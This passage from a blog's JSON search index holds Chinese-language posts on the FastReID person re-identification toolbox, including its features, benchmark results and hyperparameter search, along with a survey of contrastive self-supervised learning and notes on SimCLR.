projects/FastDistill/logs/dukemtmc/r101_ibn/config.yaml KD.MODEL_WEIGHTS projects/FastDistill/logs/dukemtmc/r101_ibn/model_best.pth . 自动超参搜索 . 炼丹一直困扰着各位调参侠，特别是每次到了一个新的场景，就需要重新调参来适应新的数据分布，非常浪费时间。 所以我们决定在 FastReID 中加入了自动超参搜索的功能来解放各位调参侠的双手，让大家可以更好的划水。 . 通过一系列调研，最后决定使用 ray[tune] 这个超参搜索的库，在集成到 FastReID 中间也遇到了非常多的坑，最后我们成功地在 FastReID 中实现了超参搜索的功能。 . 使用方式非常简单，如果你想用 Bayesian 超参搜索跑 12 组试验，可以使用下面的代码就可以开始自动分布式训练，如果有4张卡，那么可以4个试验同步一起跑 . python3 projects/FastTune/tune_net.py --config-file projects/FastTune/configs/search_trial.yml --num-trials 12 --srch-alog &quot;bohb&quot; . 另外需要搜索的超参空间需要在 projects/FastTune/tune_net.py 中进行配置，更具体的使用方式可以参考 tutorial。 . 唯一不足的是还不能用pytorch的分布式数据并行，后续有时间会进一步优化，希望这能够成为大家打比赛刷分，做业务的利器。 . 最多最全的任务支持 . 我们刚刚发布 FastReID v0.1 时，他只是作为一个重识别的 toolbox，支持重识别的业务模型和 research。 . 后面考虑到各种识别任务的模型结构都长得差不多，所以我们希望 FastReID 只需要稍微 customize 就能够支持各种不同的任务。 . 但是每种任务都有自己的一些特殊性，把这些特殊性全部往 FastReID 里面塞肯定是不现实的，为了不引入冗余性，我们通过对每种 task 单独构建 project 的方式对 FastReID 进行扩展，同时也相当于提供了一些扩展任务的参考写法和 example，毕竟我们的文档一直没有时间写(逃~)。 . 最后呈现在 FastReID 的 projects 中一共可以支持 image classification (FastClas), attribute recognition (FastAttr), face recognition (FastFace) 和 fine-grained image retrieval (FastRetri) 4 种比较常见的识别任务，同时我们也分别跑了几个 benchmark 以保证代码的实现是正确的。 . . . 同时大家在 customize 自己的 project 时，也可以将这些 projects 中的东西进行排列组合来实现新的功能，比如将 FastDistill 和 FastFace 组合在一起，就可以实现人脸识别中的模型蒸馏。 . NAIC20 reID 比赛 . 借助 FastReID 高效的分布式训练模式和超参搜索等功能，我们拿到了 naic20 比赛的第一名，比赛方案也开源在 FastReID 的 projects/NAIC20 中。 一些比赛中的 tricks 已经直接集成到了 FastReID 中，有空再专门写一下比赛的方案吧，总结起来就是大模型+大 input size + ensemble。 . 总结 . 一套好的 codebase 对于大家做实验和做业务都起着事半功倍的效果，大家也越来越发现代码的工程质量不仅影响业务模型的研发效率和性能，同时还对研究工作有着影响。 . FastReID 不仅仅希望能给 ReID 社区提供稳定高效的代码实现，同时也希望大家能够基于 FastReID 去做算法研究，同时扩展到更多其他任务上。 . 也希望大家能够踊跃地在 GitHub 上提 issue 和 PR，让我们一起把 FastReID 越做越好。 . 在此感谢 JD AI 组的同事和老师的支持，正是因为大家的努力让 FastReID 变得更好，并且科研项目也都在 FastReID 上取得了更好的性能。 . Reference . FastReID: A Pytorch Toolbox for General Instance Re-identification, He, Lingxiao and Liao, Xingyu and Liu, Wu and Liu, Xinchen and Cheng, Peng and Mei, Tao, arXiv preprint arXiv:2006.02631, 2020 . | Deep spatial feature reconstruction for partial person re-identification: Alignment-free approach, He, Lingxiao and Liang, Jian and Li, Haiqing and Sun, Zhenan, CVPR2018 . | Foreground-aware Pyramid Reconstruction for Alignment-free Occluded Person Re-identification, He, Lingxiao and Wang, Yinggang and Liu, Wu and Zhao, He and Sun, Zhenan and Feng, Jiashi, ICCV2019 . | Black Re-ID: A Head-shoulder Descriptor for the Challenging Problem of Person Re-Identification, Boqiang, Xu and Lingxiao, He and Xingyu, Liao and Wu,Liu and Zhenan, Sun and Tao, Mei, ACM MM2020 . | A Comprehensive Overhaul of Feature Distillation, Heo, Byeongho and Kim, Jeesoo and Yun, Sangdoo and Park, Hyojin and Kwak, Nojun and Choi, Jin Young . | Distilling the Knowledge in a Neural Network, Geoffrey Hinton, Oriol Vinyals, Jeff Dean . | Tune: A Research Platform for Distributed Model Selection and Training, Liaw, Richard and Liang, Eric and Nishihara, Robert and Moritz, Philipp and Gonzalez, Joseph E and Stoica, Ion . | ArcFace: Additive Angular Margin Loss for Deep Face Recognition, Jiankang Deng, Jia Guo, Niannan Xue, Stefanos Zafeiriou . | PaddleClas: https://github.com/PaddlePaddle/PaddleClas . | .",
            "url": "https://l1aoxingyu.github.io/blogpages/reid/fastreid/2021/04/28/fastreid-v1.html",
            "relUrl": "/reid/fastreid/2021/04/28/fastreid-v1.html",
            "date": " • Apr 28, 2021"
        }
        
    
  
    
        ,"post13": {
            "title": "FastReID: 一个面向学术界和工业界的 ReID Toolbox",
            "content": "引言 . FastReID 平台已经成为京东人工智能研究（JD AI Research）的开源项目之一，它是面向学术界和工业界的研究/开源项目，主要用于研究和应用落地。 先放上 Github 链接： . fast-reid . 我们的 FastReID 也有一篇 paper 进行更加详细地介绍，如果想要了解更多关于 FastReID 的信息，可以直接去看原始 paper。 . FastReID: A Pytorch Toolbox for Real-world Person Re-identification . 接下来会分享开发 FastReID 初衷以及 FastReID 的特点。 . 动机 . 最早的时候和罗博(@罗浩)搞了一个 reid strong baseline，不过那个项目在 pytorch 的基础上，又用 ignite 包了一下，开源之后很多人都说 ignite 比较影响使用体验，所以后面在我自己维护的 baseline 版本里面就去掉了 ignite。 . 我们自己做项目，以及实习生做研究都是基于 strong baseline 去魔改的，后面发现各自搞的 project 和原始的 baseline 差别越来越大，导致我们想要在实际场景中运用研究工作时效果不好，遇到了很多代码不对齐的现象。出现这个问题原因在于其中一个同学修改了某一个训练逻辑或者预处理的地方，他自己忘记了，最终发现把模型合并在一起的效果总是不好，需要花很多时间去解决这些琐碎的问题。 . 正是由于这个原因，我们决定把 baseline 这套框架封成一个库，大家基于这套库去做工作就更利于找到各自定制化的地方。开源社区中也有几个比较流行的 reid 库，比如 torchreid，Person_reID_baseline_pytorch 等等，都是很好的库，值得我们去学习。最近 Facebook AI Researck 开源了 Detectron2 项目，它里面的整体概念和设计哲学都非常棒，所以我们决定参考 detectron2 的设计来整个 FastReID 架构。 基于 FastReID，我们的产品模型和 research 的模型有了比较好的兼容性，同时也比较容易去 customize 一些功能，模块化的设计允许研究人员能自定义地插入自己想要的模块。 . 我们构建 FastReID 的目的在于满足 JD AI Research 的研究需求，能够快速地准备地实现一些 ideas，并且能够将研究员的研究成果快速地部署到实践中。 无论在学术界还是工业界，开源项目都有助于整个社区的快速发展，使我们的想法快速付诸于实际落地项目中。我们也希望 FastReID 的发布能够继续加速行人重识别领域的发展。 . 一些新特性 . FastReID 采用高度模块化设计，它具有更高的灵活性和可扩展性，能够在支持多 GPU 训练，它的扩展性设计使其在重构代码的情况快速实现很多研究项目。 . 下面我们介绍一下其中的一些新特性。 . 1.基于 FastReID，我们在多个 ReID 任务都获得非常不错的性能，并且用于业务线中，包括行人 ReID、Occluded/Partial 行人 ReID、跨域行人 ReID 和车辆 ReID。 . 虽然在 ReID 发展的这几年里面，有了很多 ReID 的 paper，大家的刷的点也越来越高了，但是性能好且稳定的方法其实还是基于最简单的 global feature 和分块的 local feature，其他使用额外信息如 pose，mask，parsing 之类的方法在实际使用中都不够稳定，同时也比较笨重。 . 所以我们在 toolbox 中内置了这两种方法，一种是基于 global feature 的 strong baseline，一种是基于分块的 MGN。 然后在 BagofTricks 的基础上，将其他可能有用的 tricks 都实现了一下，包括有效的，比如 circle loss，gem pooling 之类的，也有没有效果的，比如 SWA, AugMix 等等。 最终基于 ResNet50-ibn backbone，在三个数据库上实现了下面的性能 . Method Market1501 DukeMTMC MSMT17 .   | Rank@1 (mAP) | Rank@1 (mAP) | Rank@1 (mAP) | . BagTricks | 94.4% (86.1%) | 87.1% (76.9%) | 72.3% (48.3%) | . FastReID-baseline | 95.7% (89.3%) | 91.3% (81.6%) | 84.0% (61.2%) | . FastReID-MGN | 95.8% (89.7%) | 91.6% (82.1%) | 85.1% (65.4%) | . 在 Marekt1501 上面提升空间已经不大了，因为后面有一些错误标签，但是在 DukeMTMC 和 MSMT17 上还是有比较显著的提升，详情可以去 model zoo 里面查看完整的配置文件。 . 在 partial re-id 上，我们也基于之前 DSR 的工作，在三个 partial 库上有了持续的提升 . Method PartialReID OccludedReID PartialiLIDS .   | Rank@1 (mAP) | Rank@1 (mAP) | Rank@1 (mAP) | . FPR | 81.0% (76.6%) | 78.3% (68.0%) | 68.1% (61.8%) | . FastReID-DSR | 82.7% (76.8%) | 81.6% (70.9%) | 73.1% (79.8%) | . 具体可以去 projects/PartialReID 中查看代码和训练配置。 . 在 cross-domain reid 上面，我们也做了一些工作，正在投稿中，之后会在开源在projects/Cross-domain-reid 中，从效果上看，在跨域上已经大大缩小了和有监督 reid 的差距。 . Method Market1501 to DukeMTMC DukeMTMC to Market1501 .   | Rank@1 (mAP) | Rank@1 (mAP) | . DirectTransfer | 54.4% (34.0%) | 62.6% (32.1%) | . Our method | 82.7% (69.2%) | 92.7% (80.5%) | . 在实际场景中我们发现穿黑衣服的人是一个比较难的问题，所以我们也基于 FastReID 构建了头肩模块去解决黑衣人的问题，也实现了比较不错的性能提升，paper 正在投稿，后面会开源在 projects/HAA 中。 . Method Black-ReID .   | Rank@1 (mAP) | . Baseline(R50) | 80.9% (70.8%) | . HAA(R50) | 86.7% (79.0%) | . 在 vehicle re-id 上，我们也在 VeRI 数据集上跑了一下 baseline，得到了一个比较不错的结果，另外两个数据集 VehicleID 和 VERI-Wild 上也跑了一下，具体可以去 model zoo 里面查看。 . Method VeRi .   | Rank@1 (mAP) | . FastReID-baseline | 97.0% (81.9%) | . 另外还有一些基于 FastReID 做的工作都在投稿中，就不详细介绍了，后续都会开源在 fast-reid/projects 里面。 . 2.在模型评估上我们实现了更多的功能，比如我们支持比较灵活的测试方式，通过下面的命令可以实现在 Market1501 和 MSMT17 上联合训练，然后在 Market1501 和 DukeMTMC 上进行测试。 . DATASETS: NAMES: (&quot;Market1501&quot;, &quot;MSMT17&quot;,) TESTS: (&quot;Market1501&quot;, &quot;DukeMTMC&quot;,) . 另外也提供了更加丰富的指标评估，除了 reid 中最为常见的 CMC 和 mAP，以及在 reid-survey 中提出的 mINP之外，我们还提供了 ROC 曲线和分布图 . 因为我们发现在实际业务场景中往往是开集测试，甚至 gallery 都是在动态变化的，在这种情况下通过单一的 rank1 或者是 mAP 来评估模型就不那么准确了，在实际应用时往往需要卡阈值再出 topK，所以通过分布和 ROC 曲线可以更好地帮我们找到阈值。 . 除了评估指标，可视化其实非常重要，通过可视化 rank list 可以快速定位模型的问题，同时也会发现一些错误标注，比如通过可视化我们发现 Market1501 里面有一些错误标注，最高的 rank@1 就只能做到 96 左右，而一些公司的 PR 文可以做到 99，我也不知道他们是怎么做到把标注错误都搞定的 😂。 . 我们发现很多库都只是实现了最基本的可视化功能，比如可视化 rank list，但是这种单一的可视化其实并不能帮助我们从多个维度了解问题，所以我们实现了更好的可视化功能。首先可以根据每个 query 的 AP 进行排序展示，比如 AP 从小到大进行展示，那么可视化出来的第一张图片就是 AP 最低的 query，通过这个方式我们可以了解到模型处理能力最差的 bad case。 . 另外我们在看预测结果的时候，其实也会想知道到底这个 query 的标注是怎么样的图片，比如我们再看 duke 数据集中下面的 rank list 时，发现他的 AP 是0，下面的蓝色框表示都是错误的匹配。 . 这时我们就会疑惑，到底这张 query 的标注长什么样，这时如果我们像下面这样将 label 同时可视化出来，我们就可以快速地知道，原来 query 其实是黄衣服后面那个黑衣服的人，因为是用 tracking 算法标注的，他大部分都被前面穿黄衣服的人挡住了，所以模型无法找对，而且这种情况下搞模型结构很难解决的，在实际业务中直接从源头上选择质量好的 query 是一个更好的解决方案。 . 3.大多数的库都只关注学术界做 research，我们更希望能够产学研结合，research 中 work 的东西能够快速到实际场景中去验证效果，发现实际中真正需要解决的问题。 当然在实际研究中可以天马行空去写代码，但是这份代码无法快速地在实际场景中去验证，如果基于 FastReID 去重构和开发，那么我们就能够找到新方法所需要的最小代码实现，就能够很轻易地移植到实际业务中，也不用把大量的时间花在对齐训练逻辑以及预处理上了。 . 另外就是如何将 pytorch 训练的模型更容易地部署到生产环境上，这也是工业界比较关心的事情，python 写的模型如果没有优化和加速的话，在实际中是很慢的。 为了更好地在工业界中应用，我们会在 FastReID 中加上一些脚本能够容易地将 pytorch 训练的模型转到 caffe 和 TensorRT 上，最后做一下模型的量化。目前 pytorch 升级到 1.3 之后慢慢开始支持量化了，我们也会尝试在 pytorch 端直接做量化，和蒸馏小模型。不过这些部分的内容还在整理和开发中，目前还没有 ready。 . 未来的一些改进方向 . 上面说了 FastReID 中的一些新特性，同时还有一些地方需要继续改进。 . 目前的多卡训练还是基于 DataParallel 来实现的，会存在负载不均衡，速度损失以及无法实现多机的缺点，我们正在用 DistributedDataParallel 来替换 DataParallel。 | 模型转换，量化和蒸馏小模型等部分的代码还没有搞定，后续会慢慢开源一部分。 | 可能会考虑将 FastReID 推广到通用的 image retrieval 上。 | 结语 . 科技的进步是整个社区的努力，包括学术界和工业界。 个人的努力永远赶不上整个社区的努力，这也是开源 FastReID 的初衷。 我们一直主张共享代码，快速试验新的想法，通过 FastReID 的发布加速整个 ReID 的产业化落地。 我们也会继续发展和完善FastReID。希望大家能够 star/fork/watch/pr，大家互相学习，共同推动计算机视觉的发展。 . 在此感谢 JD AI 组的同事和老师的支持，正是因为大家的努力让 FastReID 变得更好，并且科研项目也都在 FastReID 上取得了很好的性能。 . . [1] Luo, Hao and Gu, Youzhi and Liao, Xingyu and Lai, Shenqi and Jiang, Wei. Bag of Tricks and a Strong Baseline for Deep Person Re-Identification. . [2] Wang, G. and Yuan, Y. and Chen, X. and Li, J. and Zhou, X. Learning Discriminative Features with Multiple Granularities for Person Re-Identification. . [3] Ye, Mang and Shen, Jianbing and Lin, Gaojie and Xiang, Tao and Shao, Ling and Hoi, Steven C. H.Deep Learning for Person Re-identification: A Survey and Outlook. . [4] Y. Sun, C. Cheng, Y. Zhang, C. Zhang, L. Zheng, Z. Wang, Y. Wei. Circle Loss: A Unified Perspective of Pair Similarity Optimization. .",
            "url": "https://l1aoxingyu.github.io/blogpages/reid/fastreid/2020/05/29/fastreid.html",
            "relUrl": "/reid/fastreid/2020/05/29/fastreid.html",
            "date": " • May 29, 2020"
        }
        
    
  
    
        ,"post14": {
            "title": "Self-Supervised Learning 入门介绍",
            "content": "引子 . 最近 self-supervised learning 变得非常火，首先是 kaiming 的 MoCo 引发一波热议，然后最近 Yann 在 AAAI 上讲 self-supervised learning 是未来。 所以觉得有必要了解一下 SSL，也看了一些 paper 和 blog，最后决定写这篇文章作为一个总结。 . . 什么是 Self-Supervised Learning . 首先介绍一下到底什么是 SSL，我们知道一般机器学习分为监督学习，非监督学习和强化学习。 而 self-supervised learning 是无监督学习里面的一种，主要是希望能够学习到一种通用的特征表达用于下游任务。 其主要的方式就是通过自己监督自己，比如把一段话里面的几个单词去掉，用他的上下文去预测缺失的单词，或者将图片的一些部分去掉，依赖其周围的信息去预测缺失的 patch。 . 根据我看的文章，现在 self-supervised learning 主要分为两大类：1. Generative Methods；2. Contrastive Methods。 下面我们分别简要介绍一下这这两种方法。 . Generative Methods . 首先我们介绍一下 generative methods。 这类方法主要关注 pixel space 的重建误差，大多以 pixel label 的 loss 为主。 主要是以 AutoEncoder 为代表，以及后面的变形，比如 VAE 等等。 对编码器的基本要求就是尽可能保留原始数据的重要信息，所以如果能通过 decoder 解码回原始图片，则说明 latent code 重建的足够好了。 . . 这种直接在 pixel level 上计算 loss 是一种很直观的做法，除了这种直接的做法外，还有生成对抗网络的方法，通过判别网络来算 loss。 . 对于 generative methods，有一些问题，比如： . 基于 pixel 进行重建计算开销非常大； | 要求模型逐像素重建过于苛刻，而用 GAN 的方式构建一个判别器又会让任务复杂和难以优化。 | 从这个 blog 中我看到一个很好的例子来形容这种 generative methods。 对于一张人民币，我们能够很轻易地分辨其真假，说明我们对其已经提取了一个很好的特征表达，这个特征表达足够去刻画人民币的信息， 但是如果你要我画一张一模一样的人民币的图片，我肯定没法画出来。 通过这个例子可以明显看出，要提取一个好的特征表达的充分条件是能够重建，但是并不是必要条件，所以有了下面这一类方法。 . . Contrasive self-supervised learning . 除了上面这类方法外，还有一类方法是基于 contrastive 的方法。 这类方法并不要求模型能够重建原始输入，而是希望模型能够在特征空间上对不同的输入进行分辨，就像上面美元的例子。 . 这类方法有如下的特点：1. 在 feature space 上构建距离度量；2. 通过特征不变性，可以得到多种预测结果；3. 使用 Siamese Network；4. 不需要 pixel-level 重建。 正因为这类方法不用在 pixel-level 上进行重建，所以优化变得更加容易。当然这类方法也不是没有缺点，因为数据中并没有标签，所以主要的问题就是怎么取构造正样本和负样本。 . 目前基于 contrastive 的方法已经取得了很好的紧张，在分类任上已经接近监督学习的效果，同时在一些检测、分割的下游任务上甚至超越了监督学习作为 pre-train的方法。 . 下面是这两类方法的总结图片。 . . 为什么需要 self-supervised learning . 上面我们讲了什么是 self-supervised learning，那么为什么我们需要自监督学习呢，以及它能够给我们带来哪些帮助？ . 在目前深度学习发展的情况下，对于监督学习，我们希望使用更少的标注样本就能够训练一个泛化能力很好的模型，因为数据很容易获取，但是标注成本却是非常昂贵的。 而在强化学习中，需要大量的经验对 agent 进行训练，如果能搞减少 agent 的尝试次数，也能够加速训练。 除此之外，如果拿到一个好的特征表达，那么也有利于做下游任务的 finetune 和 multi-task 的训练。 . 最后我们总结一下监督学习和自监督学习的特点，其中 supervised learning 的特点如下： . 对于每一张图片，机器预测一个 category 或者是 bounding box | 训练数据都是人所标注的 | 每个样本只能提供非常少的信息(比如 1024 个 categories 只有 10 bits 的信息) | 于此对比的是，self-supervised learning 的特点如下： . 对于一张图片，机器可以预任何的部分 | 对于视频，可以预测未来的帧 | 每个样本可以提供很多的信息 | 所以通过自监督学习，我们可以做的事情可以远超过监督学习，也难怪 Yann 未来看好 self-supervised learning。 目前出现的性能很好的文章主要是基于 contrastive 的方法，所以下面我们介绍几篇基于 contrastive 方法的文章。 . Contrastive Predictive Coding . 第一篇文章是 Representation Learning with Contrastive Predictive Coding。 这篇文章主要是通过 contrastive 的方式在 speech, images, text 和 reinforcement learning 中都取得了很好的效果。 . 从前面我们知道，由一个原始的 input 去建模一个 high-level representation 是很难的，这也是自监督学习想做的事情。 其中常用的策略是: future，missing 和 contextual，即预测未来的信息，比如 video 中当前帧预测后面的帧；丢失的信息或者是上下文的信息，比如 NLP 里面的 word2vec 和 BERT。 . 对于一个目标 x 和他的上下文 c 来说，直接去建模输出 $p(x|c)$ 会损失很多信息，将 target x 和 context c 更合适的建模方式是最大化他们之间的 mutual information，即下面的公式 . I(x;c)=∑x,cp(x,c)log⁡p(x∣c)p(x)I(x; c)= sum_{x, c} p(x, c) log frac{p(x | c)}{p(x)}I(x;c)=x,c∑​p(x,c)logp(x)p(x∣c)​ . 优化了他们之间的互信息，即最大化 $ frac{p(x | c)}{p(x)}$，说明 $p(x|c)$ 要远大于 $p(x)$，即在给定 context c 的情况下， 要找到专属于 c 的那个 x，而不是随机采样的 x。 . 基于这个观察，论文对 density ratio 进行建模，这样可以保留他们之间的互信息 . fk(xt+k,ct)∝p(xt+k∣ct)p(xt+k)f_{k} left(x_{t+k}, c_{t} right) propto frac{p left(x_{t+k} | c_{t} right)}{p left(x_{t+k} right)}fk​(xt+k​,ct​)∝p(xt+k​)p(xt+k​∣ct​)​ . 对于这个 density ratio，可以构建左边的函数 f 去表示它，只要基于函数 f 构造下面的损失函数，优化这个损失函数就等价于优化这个 density ratio，下面论文会证明这一点。 . LN=−EX[log⁡fk(xt+k,ct)∑xj∈Xfk(xj,ct)] mathcal{L}_{ mathrm{N}}=- underset{X}{ mathbb{E}} left[ log frac{f_{k} left(x_{t+k}, c_{t} right)}{ sum_{x_{j} in X} f_{k} left(x_{j}, c_{t} right)} right]LN​=−XE​[log∑xj​∈X​fk​(xj​,ct​)fk​(xt+k​,ct​)​] . 而这个损失函数，其实就是一个类似交叉熵的函数，分子是正样本的概率，分母是正负样本的概率求和。 . 下面我们证明如果能够最优化这个损失函数，则等价于优化了 density ratio，也就优化了互信息。 . 首先将这个 loss 函数变成概率的形式，最大化这个正样本的概率分布，然后通过 bayesian 公式进行推导，其中 X 是负样本，和 $x_i$ 以及 c 都无关。 . p(xi∣X,ct)=p(X∣xi,ct)p(xi∣ct)∑j=1Np(X∣xj,ct)p(xj∣ct)=p(xi∣ct)∏l≠ip(xl)∑j=1Np(xj∣ct)∏l≠jp(xl)=p(xi∣ct)p(xi)∑j=1Np(xj∣ct)p(xj) begin{aligned} p left(x_i | X, c_{t} right) &amp;= frac{p(X | x_i, c_t) p(x_i | c_t)}{ sum_{j=1}^N p(X | x_j, c_t) p(x_j | c_t)} . &amp;= frac{p left(x_{i} | c_{t} right) prod_{l neq i} p left(x_{l} right)}{ sum_{j=1}^{N} p left(x_{j} | c_{t} right) prod_{l neq j} p left(x_{l} right)} &amp;= frac{ frac{p left(x_{i} | c_{t} right)}{p left(x_{i} right)}}{ sum_{j=1}^{N} frac{p left(x_{j} | c_{t} right)}{p left(x_{j} right)}} end{aligned}&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;p(xi​∣X,ct​)​=∑j=1N​p(X∣xj​,ct​)p(xj​∣ct​)p(X∣xi​,ct​)p(xi​∣ct​)​=∑j=1N​p(xj​∣ct​)∏l​=j​p(xl​)p(xi​∣ct​)∏l​=i​p(xl​)​=∑j=1N​p(xj​)p(xj​∣ct​)​p(xi​)p(xi​∣ct​)​​​&lt;/span&gt;&lt;/span&gt; . 通过上面的推导，可以看出优化这个损失函数其实就是在优化 density ratio。论文中把 f 定义成一个 log 双线性函数，后面的论文更加简单，直接定义为了 cosine similarity。 . fk(xt+k,ct)=exp⁡(zt+kTWkct)f_{k} left(x_{t+k}, c_{t} right)= exp left(z_{t+k}^{T} W_{k} c_{t} right)fk​(xt+k​,ct​)=exp(zt+kT​Wk​ct​) . 有了这个 loss，我们只需要采集正负样本就可以了。 对于语音和文本，可以充分利用了不同的 k 时间步长，来采集正样本，而负样本可以从序列随机取样来得到。 对于图像任务，可以使用 pixelCNN 的方式将其转化成一个序列类型，用前几个 patch 作为输入，预测下一个 patch。 . . . Deep InfoMax . 通过上面的分析和推导，我们有了这样一个通用的框架，那么 deep infomax 这篇文章就非常好理解了，其中正样本就是第 i 张图片的 global feature 和中间 feature map 上个的 local feature，而负样本就是另外一张图片作为输入，非常好理解。 . . Contrastive MultiView Coding . 除了像上面这样去构建正负样本，还可以通过多模态的信息去构造，比如同一张图片的 RGB图 和 深度图。 CMC 这篇 paper 就是从这一点出发去选择正样本，而且通过这个方式，每个 anchor 不仅仅只有一个正样本，可以通过多模态得到多个正样本，如下图右边所示。 . . 现在我们能够拿到很多正样本，问题是怎么获得大量的负样本，对于 contrastive loss 而言，如何 sample 到很多负样本是关键，mini-batch 里面的负样本太少了，而每次对图片重新提取特征又非常的慢。虽然可以通过 memory bank 将负样本都存下来，但是效果并不好，所以如何节省内存和空间获得大量的负样本仍然没有很好地解决。 . MoCo . 有了上面这么多工作的铺垫，其实 contrastive SSL 的大框架已经形成了，MoCo 这篇文章也变得很好理解，可以把 target x 看成第 i 张图片的随机 crop，他的正样本通过一个 model ema 来得到，可以理解为过去 epochs 对这张图片的 smooth aggregation。 而负样本则从 memory bank 里面拿，同时 memory bank 的 feature 也是通过 model ema 得到，并且通过队列的形式丢掉老的 feature。 . . MoCo 通过工程的方式，和一些 trick，比如 model ema 和 shuffleBN 来解决之前没法很好 sample 负样本的问题。 . SimCLR . 最近，hinton 组也放了一篇做 ssl 的 paper，其实都是用的同一套框架，也没有太多的 novelty。 虽然摘要里面说可以抛弃 memory bank，不过细看论文，训练的 batchsize 需要到几千，要用32-128 cores 的 TPU，普通人根本用不起。 . 不过这篇文章系统地做了很多实验，比如探究了一下数据增强的影响，以及的 projection head 的影响等，不过也没有从理论上去解释这些问题，只是做了实验之后获得了一些结论。 . Results . . 最后展示了不同方法的结果，可以看到在性能其实已经逼近监督学习的效果，但是需要 train 4x 的时间，同时网络参数也比较大。 . 虽然性能没有超过监督学习，不过我认为这仍然给了我们很好的启发，比如训练一个通用的 encoder 来接下游任务，或者是在 cross domain 的时候只需要少量样本去 finetune，这都会给实际落地带来收益。 . Reference . contrastive self-supervised learning . deep infomax 和 深度学习中的互信息 .",
            "url": "https://l1aoxingyu.github.io/blogpages/summary/self-supervised%20learning/2020/02/20/ssl-survey.html",
            "relUrl": "/summary/self-supervised%20learning/2020/02/20/ssl-survey.html",
            "date": " • Feb 20, 2020"
        }
        
    
  
    
        ,"post15": {
            "title": "A Simple Framework for Contrastive Learning of Visual Representations" 阅读笔记",
            "content": "介绍 . 这篇文章是 Hinton 团队出品的，主要做的是目前炙手可热的领域，self supervised learning， 提出了一个简单的框架来解决 visual representation 中的 contrastive learning。 其实前两个月 kaiming 团队也提出了一个叫 MoCo 的方法来解决这个问题，这篇文章总体思路和 MoCo 几乎一样，最大的 contribution 我认为是去探索了框架中的每个部分分别对最终结果的影响。 最后根据论文的发现，作者调出了目前最强的结果如下，点数非常高。 . . 主要贡献 . SimCLR 整体框架如下，和目前其他的方法是一致的 . . 主要由四个部分组成： . 随机数据增强 | 神经网络 encoder | project head $g( centerdot)$ 进行非线性映射和降维 | contrastive loss 函数 | li,j=−log⁡exp⁡(sim(zi,zj)/τ)∑k≠iexp⁡(sim(zi,zk)/τ)l_{i,j} = - log frac{ exp(sim(z_i, z_j)/ tau)}{ sum_{k neq i} exp(sim(z_i, z_k)/ tau)}li,j​=−log∑k​=i​exp(sim(zi​,zk​)/τ)exp(sim(zi​,zj​)/τ)​ . Memory bank . 这篇文章提出了可以去掉 memory bank 进行训练，实际上并不可行。 因为作者使用了 8192 的 batch size，这样每个 batch 可以产生 16382 个负样本。 当然当前 batch 提取的 feature 对比 memory bank 更好，但是这需要 128 cores 的 TPU 进行训练，对于财大气粗的 google 当然用得起，对于普通的研究人员来讲，还是老老实实用 memory bank 吧。 . Global BN . 使用 contrastive loss 进行训练的时候，正样本是一张相同的图片通过不同的数据增强方式得到的，这两张图片都在相同的 batch 中，这样非常因为 bn 统计量的问题出现信息泄露。 这篇文章使用了 global bn 的方式来就解决，即大 batch 下面，使用所有图片统计 bn 的均值和方差。 当然使用 MoCo 中的 suffle bn 也是可以的。 . 数据增强 . 本文系统的探索了数据增强对于表示学习的影响，其中 random cropping 和 random color distortion 是非常有用的。 random cropping 可以产生很多小 patch，但是这些小 patch 有着非常相似的颜色分布，所以可以用 color distortion 去弥补这个问题。 . Projection Head . 不同的 head 也有着不同的影响 . . 可以看出，直接使用 global average feature 效果是最差的，而一个 non-linear head 有着最好的效果。 . 其他的因素 . 除了上面这些因素之外，还用 contrastive loss 中的 temperatual factor $ tau$ 的影响，以及是否对 feature 做归一化。 当然这些在别的 paper 中都有了结论，这里就不再赘述。 . 另外还有 batch size 的影响，因为其没有用 memory bank，当然 batch size 越大，包含越多的负样本，效果越好。 . 总结 . 总体来说，这篇文章通过了很多实验来验证到底是哪些因素影响了 SSL 的效果。 很多结论也非常 solid，效果也非常好，可以指导很多调参的工作， 但是 novelty 上并没有给人太大的启发。 .",
            "url": "https://l1aoxingyu.github.io/blogpages/self-supervised%20learning/2020/02/15/simclr.html",
            "relUrl": "/self-supervised%20learning/2020/02/15/simclr.html",
            "date": " • Feb 15, 2020"
        }
        
    
  

  
  

  
      ,"page1": {
          "title": "About Me",
          "content": "Currently, Xingyu is working as the Researcher Engineer in JD AI Lab. . Before that, Xingyu received his M.Sc.’s degree in USTC (University of Science and Technology of China). . Research Interests . Xingyu’s current research interests mainly include machine learning, computer vision, especially on deep learning, visual recognition and person re-identification. .",
          "url": "https://l1aoxingyu.github.io/blogpages/about/",
          "relUrl": "/about/",
          "date": ""
      }
      
  

  

  
  

  

  
  

  

  
  

  
  

  

  
  

  
      ,"page11": {
          "title": "",
          "content": "Sitemap: {{ “sitemap.xml” | absolute_url }} | .",
          "url": "https://l1aoxingyu.github.io/blogpages/robots.txt",
          "relUrl": "/robots.txt",
          "date": ""
      }
      
  

}